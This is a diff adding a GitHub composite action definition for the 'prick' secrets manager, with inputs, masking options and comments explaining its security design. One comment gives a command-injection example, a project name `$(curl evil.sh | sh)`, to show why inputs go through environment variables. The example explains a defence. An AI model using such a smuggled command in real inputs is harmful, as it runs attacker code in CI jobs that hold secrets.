@@ -1,0 +1,173 @@
+# =============================================================================
+# The official action for consuming prick secrets in a workflow.
+#
+#   - uses: yashau/prick/action@v2026.815.0
+#     with:
+#       url: ${{ secrets.PRICK_URL }}
+#       client-id: ${{ secrets.PRICK_ACCESS_CLIENT_ID }}
+#       client-secret: ${{ secrets.PRICK_ACCESS_CLIENT_SECRET }}
+#       project: api
+#       environment: production
+#
+# WHY THIS IS A COMPOSITE ACTION AND NOT A BUNDLED JAVASCRIPT ONE
+#
+# A JavaScript action must commit its own `dist/` -- a build artefact, checked
+# in, that no reviewer reads and that nothing in the repository can prove was
+# built from the sources next to it. For a secrets manager that is exactly the
+# wrong shape: the thing with access to every secret in an environment would be
+# the one file nobody looks at. A composite action installs the CLI that is
+# already published, signed and provenance-attested, and everything this action
+# adds is the two readable files beside this one.
+#
+# WHY EVERY INPUT IS PASSED THROUGH `env:` AND NEVER INTERPOLATED INTO A SHELL
+#
+# `run: prk --project ${{ inputs.project }}` would expand the input into the
+# script BEFORE bash parses it, so a project named `$(curl evil.sh | sh)` would
+# run. Inputs reach the script as environment variables, where they are data.
+# =============================================================================
+
+name: Inject prick secrets
+description: >-
+  Read a project environment from a self-hosted prick server and expose every
+  secret in it to the rest of the job as a masked environment variable.
+author: yashau
+
+branding:
+  icon: lock
+  color: orange
+
+inputs:
+  url:
+    description: >-
+      Base URL of the prick server, for example https://prick.example.com.
+      Must be https: the Access service token is sent as a request header, and
+      over plaintext it is readable by anything on the path.
+    required: true
+
+  client-id:
+    description: >-
+      Cloudflare Access SERVICE TOKEN client id, sent as CF-Access-Client-Id.
+      Ends in `.access`. This is not an SSO login and not an API key; see the
+      README for how to create one.
+    required: true
+
+  client-secret:
+    description: >-
+      Cloudflare Access service token client secret, sent as
+      CF-Access-Client-Secret. Store it as a repository or environment secret.
+    required: true
+
+  project:
+    description: Project to read from. Matched exactly, and case-sensitively.
+    required: true
+
+  environment:
+    description: Environment to read from. Matched exactly, and case-sensitively.
+    required: false
+    default: production
+
+  keys:
+    description: >-
+      Optional allowlist of secret names, separated by newlines or commas.
+      When set, only these are injected -- and a name that the environment does
+      not have fails the step rather than starting the job without it.
+    required: false
+    default: ""
+
+  prefix:
+    description: >-
+      Optional string prepended to every environment variable name, for example
+      `APP_`. Must itself be a valid environment variable name fragment.
+    required: false
+    default: ""
+
+  export-to:
+    description: >-
+      `env` (the default) appends every secret to $GITHUB_ENV, so later steps
+      see them as ordinary environment variables. `outputs` instead sets a
+      single `secrets` output holding a JSON object, for the cases where a
+      value has to be passed to another action's `with:`. Prefer `env`.
+    required: false
+    default: env
+
+  version:
+    description: >-
+      Version of the @yashau/prick CLI to install. Defaults to this action's own
+      ref when that ref is a release tag, so the action and the CLI cannot
+      drift; a floating ref falls back to the `latest` dist-tag.
+    required: false
+    default: ""
+
+  mask:
+    description: >-
+      Register every value with the runner's log masker before it is written
+      anywhere. Setting this to false MEANS SECRET VALUES WILL APPEAR IN THE
+      JOB LOG in full, readable by everyone who can read the repository. There
+      is no good reason to set it to false.
+    required: false
+    default: "true"
+
+  allow-unsafe-names:
+    description: >-
+      Permit secrets whose names the runner, the dynamic loader or a language
+      runtime interprets before a program starts -- GITHUB_*, RUNNER_*,
+      ACTIONS_*, PATH, NODE_OPTIONS, LD_*, DYLD_* and friends. They are skipped
+      with a warning by default, because a value written to $GITHUB_ENV applies
+      to every later step in the job, so a secret store that can set one of
+      these controls the whole job.
+    required: false
+    default: "false"
+
+outputs:
+  keys:
+    description: >-
+      Newline-separated names of the variables that were injected, after any
+      prefix. Names only, never values, so this is safe to print.
+    value: ${{ steps.inject.outputs.keys }}
+
+  secrets:
+    description: >-
+      A JSON object of the fetched secrets, set only when `export-to` is
+      `outputs`. Every value is masked, but this is still the less safe of the
+      two modes: prefer `export-to: env`.
+    value: ${{ steps.inject.outputs.secrets }}
+
+runs:
+  using: composite
+
+  steps:
+    - name: Install the prick CLI
+      id: install
+      shell: bash
+      run: node "${GITHUB_ACTION_PATH}/inject.mjs" install
+      env:
+        PRICK_INPUT_URL: ${{ inputs.url }}
+        PRICK_INPUT_CLIENT_ID: ${{ inputs.client-id }}
+        PRICK_INPUT_CLIENT_SECRET: ${{ inputs.client-secret }}
+        PRICK_INPUT_PROJECT: ${{ inputs.project }}
+        PRICK_INPUT_ENVIRONMENT: ${{ inputs.environment }}
+        PRICK_INPUT_KEYS: ${{ inputs.keys }}
+        PRICK_INPUT_PREFIX: ${{ inputs.prefix }}
+        PRICK_INPUT_EXPORT_TO: ${{ inputs.export-to }}
+        PRICK_INPUT_VERSION: ${{ inputs.version }}
+        PRICK_INPUT_MASK: ${{ inputs.mask }}
+        PRICK_INPUT_ALLOW_UNSAFE_NAMES: ${{ inputs.allow-unsafe-names }}
+        GITHUB_ACTION_REF: ${{ github.action_ref }}
+
+    - name: Fetch and inject secrets
+      id: inject
+      shell: bash
+      run: node "${GITHUB_ACTION_PATH}/inject.mjs" inject
+      env:
+        PRICK_INPUT_URL: ${{ inputs.url }}
+        PRICK_INPUT_CLIENT_ID: ${{ inputs.client-id }}
+        PRICK_INPUT_CLIENT_SECRET: ${{ inputs.client-secret }}
+        PRICK_INPUT_PROJECT: ${{ inputs.project }}
+        PRICK_INPUT_ENVIRONMENT: ${{ inputs.environment }}
+        PRICK_INPUT_KEYS: ${{ inputs.keys }}
+        PRICK_INPUT_PREFIX: ${{ inputs.prefix }}
+        PRICK_INPUT_EXPORT_TO: ${{ inputs.export-to }}
+        PRICK_INPUT_VERSION: ${{ inputs.version }}
+        PRICK_INPUT_MASK: ${{ inputs.mask }}
+        PRICK_INPUT_ALLOW_UNSAFE_NAMES: ${{ inputs.allow-unsafe-names }}
+        GITHUB_ACTION_REF: ${{ github.action_ref }}
